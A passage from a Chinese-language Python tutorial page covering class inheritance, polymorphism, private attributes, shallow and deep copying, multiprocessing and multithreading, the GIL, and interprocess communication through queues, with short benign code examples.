创建Dog对象</span></span><br><span class="line">dog = Dog(<span class="string">&quot;Buddy&quot;</span>, <span class="number">3</span>)</span><br><span class="line">dog.speak()  <span class="comment"># 输出：Buddy says Woof!</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Dog</code>类继承了<code>Animal</code>类，并重写了<code>speak</code>方法。通过<code>super()</code>函数调用父类的构造函数，从而初始化<code>Animal</code>类的属性。</p><h2 id="类的多态"><a href="#类的多态" class="headerlink" title="类的多态"></a>类的多态</h2><p>多态是指同一个方法在不同类的对象上有不同的表现。在Python中，方法的多态性通常是通过继承和方法重写实现的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(<span class="string">&quot;Cat&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> says Meow!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建不同的对象</span></span><br><span class="line">dog = Dog(<span class="string">&quot;Buddy&quot;</span>, <span class="number">3</span>)</span><br><span class="line">cat = Cat(<span class="string">&quot;Whiskers&quot;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用相同的方法，但不同的表现</span></span><br><span class="line">dog.speak()  <span class="comment"># 输出：Buddy says Woof!</span></span><br><span class="line">cat.speak()  <span class="comment"># 输出：Whiskers says Meow!</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>dog.speak()</code>和<code>cat.speak()</code>调用了相同的方法名，但由于它们分别属于<code>Dog</code>和<code>Cat</code>类，所以方法的实现不同，表现出了多态。</p><h2 id="类的私有属性与方法"><a href="#类的私有属性与方法" class="headerlink" title="类的私有属性与方法"></a>类的私有属性与方法</h2><p>在Python中，类的属性和方法默认是公有的，可以在外部访问和修改。如果希望某些属性或方法不被外部直接访问，可以通过在属性或方法名前加上双下划线（<code>__</code>）来将它们设为私有。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="variable language_">self</span>.make = make</span><br><span class="line">        <span class="variable language_">self</span>.model = model</span><br><span class="line">        <span class="variable language_">self</span>.__year = year  <span class="comment"># 私有属性</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_year</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.__year  <span class="comment"># 通过公共方法访问私有属性</span></span><br><span class="line"></span><br><span class="line">car = Car(<span class="string">&quot;Toyota&quot;</span>, <span class="string">&quot;Corolla&quot;</span>, <span class="number">2020</span>)</span><br><span class="line"><span class="built_in">print</span>(car.make)  <span class="comment"># 输出：Toyota</span></span><br><span class="line"><span class="built_in">print</span>(car.get_year())  <span class="comment"># 输出：2020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下将抛出错误，因为__year是私有的</span></span><br><span class="line"><span class="comment"># print(car.__year)  # 报错：AttributeError</span></span><br></pre></td></tr></table></figure><p>在上面的代码中，<code>__year</code>是<code>Car</code>类的私有属性，不能被外部直接访问。通过<code>get_year</code>方法，外部可以间接访问该属性。</p><h2 id="访问实例的属性的调用顺序"><a href="#访问实例的属性的调用顺序" class="headerlink" title="访问实例的属性的调用顺序"></a>访问实例的属性的调用顺序</h2><ul><li>当类属性和实例属性重名时，优先会返回实例属性</li><li>给实例对象的属性赋值时，赋值的是实例属性，如果没有对应实例属性就会新建</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>:</span><br><span class="line">    test=<span class="number">1</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, v1</span>):</span><br><span class="line">        <span class="variable language_">self</span>.v1 = v1</span><br><span class="line"></span><br><span class="line">car1 = Car(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">car2 = Car(<span class="string">&quot;bb&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(car1.test) <span class="comment"># 1</span></span><br><span class="line">Car.test = <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(Car.test) <span class="comment"># 2</span></span><br><span class="line"><span class="built_in">print</span>(car1.test) <span class="comment"># 2 这里访问的是car1的类属性</span></span><br><span class="line">car1.test = <span class="number">3</span> <span class="comment"># 这里car1新建了实例属性test，和类属性重名，后续访问car1.test就会优先访问实例属性</span></span><br><span class="line"><span class="built_in">print</span>(car1.test) <span class="comment"># 3 这里访问的是car1的实例属性</span></span><br><span class="line"><span class="built_in">print</span>(Car.test) <span class="comment"># 2 类属性没有变化</span></span><br><span class="line"><span class="keyword">del</span> car1.test <span class="comment"># 如果删除car1的实例属性</span></span><br><span class="line"><span class="built_in">print</span>(car1.test) <span class="comment"># 2 car1的类属性就显示了</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><strong>类的定义</strong>：通过<code>class</code>关键字定义类，类包含属性和方法。</li><li><strong>实例化对象</strong>：通过类创建对象，每个对象有自己独立的属性。</li><li><code>**__init__**</code><strong>方法</strong>：初始化对象的属性，是构造函数。</li><li><strong>继承</strong>：子类可以继承父类的属性和方法，重写或扩展父类的方法。</li><li><strong>多态</strong>：相同方法在不同类的对象上有不同的表现。</li><li><strong>私有属性和方法</strong>：通过双下划线（<code>__</code>）将属性和方法设为私有，避免外部直接访问。</li></ul><hr><h1 id="拷贝"><a href="#拷贝" class="headerlink" title="拷贝"></a>拷贝</h1><h2 id="Python中的拷贝"><a href="#Python中的拷贝" class="headerlink" title="Python中的拷贝"></a>Python中的拷贝</h2><p>在Python中，拷贝指的是复制一个对象的过程。拷贝操作常用于需要对对象进行修改时，避免直接修改原始对象。Python中有两种主要的拷贝方式：<strong>浅拷贝</strong>和<strong>深拷贝</strong>。理解这两种拷贝方式的区别对于编写高效、可靠的代码非常重要。</p><h3 id="浅拷贝（Shallow-Copy）"><a href="#浅拷贝（Shallow-Copy）" class="headerlink" title="浅拷贝（Shallow Copy）"></a>浅拷贝（Shallow Copy）</h3><p>浅拷贝是指创建一个新对象，但该对象的元素是原始对象中元素的引用（即内存地址）。这意味着，浅拷贝后的新对象与原始对象共享相同的元素。如果新对象的元素本身是可变的，修改这些元素会影响到原始对象。</p><p>浅拷贝可以通过<code>copy</code>模块中的<code>copy()</code>方法或对象的<code>copy()</code>方法来实现。</p><p><strong>浅拷贝示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个包含列表的字典</span></span><br><span class="line">original_dict = &#123;<span class="string">&quot;test&quot;</span>:<span class="number">1</span>,<span class="string">&quot;numbers&quot;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="string">&quot;letters&quot;</span>: [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用copy方法进行浅拷贝</span></span><br><span class="line">shallow_copy_dict = copy.copy(original_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改新字典中的元素</span></span><br><span class="line">shallow_copy_dict[<span class="string">&quot;numbers&quot;</span>].append(<span class="number">4</span>)</span><br><span class="line">shallow_copy_dict[<span class="string">&quot;test&quot;</span>]=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Original:&quot;</span>, original_dict)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shallow Copy:&quot;</span>, shallow_copy_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Original: &#123;&#x27;test&#x27;: 1, &#x27;numbers&#x27;: [1, 2, 3, 4], &#x27;letters&#x27;: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&#125;</span></span><br><span class="line"><span class="comment"># Shallow Copy: &#123;&#x27;test&#x27;: 2, &#x27;numbers&#x27;: [1, 2, 3, 4], &#x27;letters&#x27;: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&#125;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>shallow_copy_dict</code>是<code>original_dict</code>的浅拷贝。虽然字典对象本身是被复制的，但其中的<code>numbers</code>和<code>letters</code>列表依然是共享的，因此对<code>numbers</code>列表的修改会影响到<code>original_dict</code>。</p><h3 id="深拷贝（Deep-Copy）"><a href="#深拷贝（Deep-Copy）" class="headerlink" title="深拷贝（Deep Copy）"></a>深拷贝（Deep Copy）</h3><p>深拷贝会创建一个新的对象，并递归地复制原始对象中的所有元素，包括嵌套的对象。深拷贝后的新对象与原始对象完全独立，任何对新对象的修改都不会影响原始对象。</p><p>深拷贝可以通过<code>copy</code>模块中的<code>deepcopy()</code>方法来实现。</p><p><strong>深拷贝示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个包含列表的字典</span></span><br><span class="line">original_dict = &#123;<span class="string">&quot;numbers&quot;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="string">&quot;letters&quot;</span>: [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用deepcopy方法进行深拷贝</span></span><br><span class="line">deep_copy_dict = copy.deepcopy(original_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改新字典中的元素</span></span><br><span class="line">deep_copy_dict[<span class="string">&quot;numbers&quot;</span>].append(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Original:&quot;</span>, original_dict)  <span class="comment"># 输出：&#123;&#x27;numbers&#x27;: [1, 2, 3], &#x27;letters&#x27;: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&#125;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Deep Copy:&quot;</span>, deep_copy_dict)  <span class="comment"># 输出：&#123;&#x27;numbers&#x27;: [1, 2, 3, 4], &#x27;letters&#x27;: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&#125;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>deep_copy_dict</code>是<code>original_dict</code>的深拷贝。即使<code>numbers</code>列表中的内容被修改，<code>original_dict</code>的内容保持不变，因为深拷贝创建了独立的对象。</p><h2 id="浅拷贝与深拷贝的区别"><a href="#浅拷贝与深拷贝的区别" class="headerlink" title="浅拷贝与深拷贝的区别"></a>浅拷贝与深拷贝的区别</h2><h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><ul><li>浅拷贝创建一个新对象，但不会复制对象中嵌套的可变对象的内容。相反，嵌套对象的引用被复制到新对象中，导致新旧对象共享这些嵌套对象。</li><li>浅拷贝适用于只需要复制对象本身的场景，而不需要独立的嵌套对象。</li></ul><h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><ul><li>深拷贝创建一个新对象，并递归地复制所有的嵌套对象。新对象与原始对象完全独立，修改新对象的任何部分都不会影响原始对象。</li><li>深拷贝适用于需要完全独立于原始对象的场景，尤其是当对象中包含嵌套的可变对象时。</li></ul><h2 id="拷贝的注意事项"><a href="#拷贝的注意事项" class="headerlink" title="拷贝的注意事项"></a>拷贝的注意事项</h2><h3 id="拷贝与对象类型"><a href="#拷贝与对象类型" class="headerlink" title="拷贝与对象类型"></a>拷贝与对象类型</h3><p>在使用浅拷贝和深拷贝时，必须考虑到对象类型。例如，对于不可变类型（如整数、浮点数、字符串和元组），它们本身不受拷贝方式的影响，因为不可变对象一旦创建就无法修改，因此即使是浅拷贝，修改新对象也不会影响原始对象。</p><h3 id="对于自定义对象的拷贝"><a href="#对于自定义对象的拷贝" class="headerlink" title="对于自定义对象的拷贝"></a>对于自定义对象的拷贝</h3><p>对于自定义类的对象，浅拷贝和深拷贝的行为和内建数据类型略有不同。如果类的实例包含可变对象作为属性，那么浅拷贝会导致共享这些可变属性，而深拷贝则会创建独立的副本。</p><hr><h1 id="多线程和多进程"><a href="#多线程和多进程" class="headerlink" title="多线程和多进程"></a>多线程和多进程</h1><h2 id="Python中的多进程与多线程"><a href="#Python中的多进程与多线程" class="headerlink" title="Python中的多进程与多线程"></a>Python中的多进程与多线程</h2><p>Python的多进程和多线程是提高程序并发性的两种方式。它们都可以用来执行并行任务，但它们的实现原理和适用场景不同。理解它们的区别和使用场景对于编写高效的并发程序至关重要。</p><h3 id="多进程（Multiprocessing）"><a href="#多进程（Multiprocessing）" class="headerlink" title="多进程（Multiprocessing）"></a>多进程（Multiprocessing）</h3><p>多进程是指使用多个进程来执行任务，每个进程都有自己的内存空间和资源。进程之间相互独立，互不干扰。Python的<code>multiprocessing</code>模块提供了创建和管理进程的功能。</p><h4 id="多进程的特点"><a href="#多进程的特点" class="headerlink" title="多进程的特点"></a>多进程的特点</h4><ul><li><strong>独立的内存空间</strong>：每个进程都有自己的内存空间，进程之间不会共享数据。</li><li><strong>适用于CPU密集型任务</strong>：由于每个进程都独立运行，因此它们可以在多核CPU上并行执行，适合CPU密集型任务。</li><li><strong>进程间通信（IPC）</strong>：进程间的数据传输可以通过队列、管道等方式进行，<code>multiprocessing</code>模块提供了这些工具。</li></ul><h4 id="创建多进程"><a href="#创建多进程" class="headerlink" title="创建多进程"></a>创建多进程</h4><p>可以使用<code>multiprocessing</code>模块的<code>Process</code>类来创建并启动新的进程。每个进程执行一个目标函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义进程执行的任务</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Process <span class="subst">&#123;name&#125;</span> started&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Process <span class="subst">&#123;name&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建进程</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    processes = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 启动多个进程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        p = multiprocessing.Process(target=task, args=(i,))</span><br><span class="line">        processes.append(p)</span><br><span class="line">        p.start()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待所有进程完成</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All processes are done&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个示例中，创建了三个进程，每个进程执行<code>task</code>函数，并打印相关信息。<code>start()</code>方法启动进程，<code>join()</code>方法确保主进程等待所有子进程完成后再结束。</p><h4 id="多进程的优势与劣势"><a href="#多进程的优势与劣势" class="headerlink" title="多进程的优势与劣势"></a>多进程的优势与劣势</h4><ul><li><strong>优势</strong>：<ul><li>每个进程有独立的内存空间，避免了多线程中的全局变量共享问题。</li><li>适用于CPU密集型任务，可以充分利用多核CPU。</li></ul></li><li><strong>劣势</strong>：<ul><li>启动和管理进程的开销比线程大。</li><li>进程间通信比线程间通信复杂，通常需要使用队列、管道等工具。</li></ul></li></ul><h3 id="多线程（Multithreading）"><a href="#多线程（Multithreading）" class="headerlink" title="多线程（Multithreading）"></a>多线程（Multithreading）</h3><p>多线程是指在同一进程中创建多个线程来执行任务。线程之间共享同一进程的内存空间，因此线程间的通信比进程间更为高效。</p><h4 id="多线程的特点"><a href="#多线程的特点" class="headerlink" title="多线程的特点"></a>多线程的特点</h4><ul><li><strong>共享内存空间</strong>：线程间共享数据，因此可以直接访问和修改共享数据。</li><li><strong>适用于I&#x2F;O密集型任务</strong>：Python的GIL（全局解释器锁）使得多线程在执行计算密集型任务时不能有效并行执行，但在I&#x2F;O密集型任务（如文件读写、网络请求）中，多线程可以显著提高性能。</li><li><strong>线程间通信</strong>：线程之间的数据共享比较简单，但需要小心竞争条件和死锁问题。</li></ul><h4 id="创建多线程"><a href="#创建多线程" class="headerlink" title="创建多线程"></a>创建多线程</h4><p>可以使用<code>threading</code>模块来创建和管理线程。每个线程执行一个目标函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义线程执行的任务</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;name&#125;</span> started&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;name&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    threads = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 启动多个线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        t = threading.Thread(target=task, args=(i,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待所有线程完成</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All threads are done&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个示例中，创建了三个线程，每个线程执行<code>task</code>函数，<code>start()</code>方法启动线程，<code>join()</code>方法确保主线程等待所有子线程完成后再结束。</p><h4 id="多线程的优势与劣势"><a href="#多线程的优势与劣势" class="headerlink" title="多线程的优势与劣势"></a>多线程的优势与劣势</h4><ul><li><strong>优势</strong>：<ul><li>线程间共享内存，通信开销较小。</li><li>适用于I&#x2F;O密集型任务，能在等待I&#x2F;O操作时并发执行其他任务。</li></ul></li><li><strong>劣势</strong>：<ul><li>Python的GIL限制了多线程的并行执行，尤其在CPU密集型任务中，多个线程无法真正并行执行。</li><li>线程间的共享内存需要小心处理，可能会出现竞争条件、死锁等问题。</li></ul></li></ul><h3 id="Python中的GIL（全局解释器锁）"><a href="#Python中的GIL（全局解释器锁）" class="headerlink" title="Python中的GIL（全局解释器锁）"></a>Python中的GIL（全局解释器锁）</h3><p>GIL（Global Interpreter Lock）是Python解释器中的一种机制，它确保在任何时刻只有一个线程能执行Python字节码。GIL使得多线程在进行CPU密集型任务时无法实现真正的并行计算，因为即使有多个CPU核心，Python程序仍然只能在一个核心上执行字节码。</p><p>然而，GIL并不影响I&#x2F;O密集型任务。在进行文件操作、网络请求等I&#x2F;O操作时，线程会释放GIL，允许其他线程执行，从而实现并发。</p><h3 id="选择多进程还是多线程"><a href="#选择多进程还是多线程" class="headerlink" title="选择多进程还是多线程"></a>选择多进程还是多线程</h3><ul><li><strong>多进程</strong>适用于CPU密集型任务，能够充分利用多核CPU进行并行处理，避免GIL的限制。</li><li><strong>多线程</strong>适用于I&#x2F;O密集型任务，能够有效提高程序在进行网络请求、文件操作等I&#x2F;O操作时的效率。</li></ul><h2 id="进程与线程的通信"><a href="#进程与线程的通信" class="headerlink" title="进程与线程的通信"></a>进程与线程的通信</h2><h3 id="进程间通信（IPC）"><a href="#进程间通信（IPC）" class="headerlink" title="进程间通信（IPC）"></a>进程间通信（IPC）</h3><p>在Python中，进程间通信可以使用<code>multiprocessing</code>模块提供的队列、管道等工具进行。由于每个进程都有独立的内存空间，因此必须使用这些工具进行数据交换。</p><p><strong>使用队列进行进程间通信</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">q</span>):</span><br><span class="line">    q.put(<span class="string">&quot;Hello from process&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    queue = multiprocessing.Queue()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建并启动进程</span></span><br><span class="line">    p = multiprocessing.Process(target=worker, args=(queue,))</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取进程间通信的结果</span></span><br><span class="line">    <span class="built_in">print</span>(queue.get())  <span class="comment"># 输出：Hello from process</span></span><br></pre></td></tr></table></figure><h3 id="线程间通信"><a href="#线程间通信" class="headerlink" title="线程间通信"></a>线程间通信</h3><p>线程之间可以通过共享内存（如列表、字典等）进行通信，但需要注意线程安全问题。可以使用<code>threading</code>模块中的锁（Lock）来确保线程安全。</p><p><strong>使用锁进行线程间通信</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">lock</span>):</span><br><span class="line">    <span class="keyword">with</span> lock:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Thread is working&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line">    </span><br><span class="line">    threads = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        t = threading.Thread(target=worker, args=(lock,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>在这个示例中，使用了<code>Lock</code>来确保多个线程在打印时不会发生竞争条件。</p><hr><h1 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h1><h2 id="进程间通信（IPC）-1"><a href="#进程间通信（IPC）-1" class="headerlink" title="进程间通信（IPC）"></a>进程间通信（IPC）</h2><p>进程间通信（IPC, Inter-Process Communication）是指在多个进程之间交换数据和信息。由于每个进程拥有独立的内存空间，进程间的通信不像线程之间那样直接，因此需要通过特定的方式来进行数据传输。Python的<code>multiprocessing</code>模块提供了多种进程间通信的方法，包括<strong>队列（Queue）</strong>、<strong>管道（Pipe）</strong>、和 **共享内存（Value&#x2F;Array）**等。</p><h2 id="队列（Queue）"><a href="#队列（Queue）" class="headerlink" title="队列（Queue）"></a>队列（Queue）</h2><p>队列是进程间通信中最常用的方式之一。它是一个线程安全的队列，支持在多个进程之间传递数据。进程通过队列将数据放入（<code>put()</code>）和取出（<code>get()</code>），实现进程间的数据传输。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">q</span>):</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    q.put(<span class="string">&quot;Hello from the process!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 创建队列</span></span><br><span class="line">    queue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建进程并启动</span></span><br><span class="line">    process = multiprocessing.Process(target=worker, args=(queue,))</span><br><span class="line">    process.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待进程完成</span></span><br><span class="line">    process.join()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从队列中获取数据</span></span><br><span class="line">    result = queue.get()</span><br><span class="line">    <span class="built_in">print</span>(result)  <span class="comment"># 输出：Hello from the process!</span></span><br></pre></td></tr></table></figure><p>在上述代码中，<code>queue.put()</code>将数据放入队列，<code>queue.get()</code>从队列中读取数据。队列的一个重要特点是它是线程安全的，可以在多个进程间安全地传递数据。</p><h2 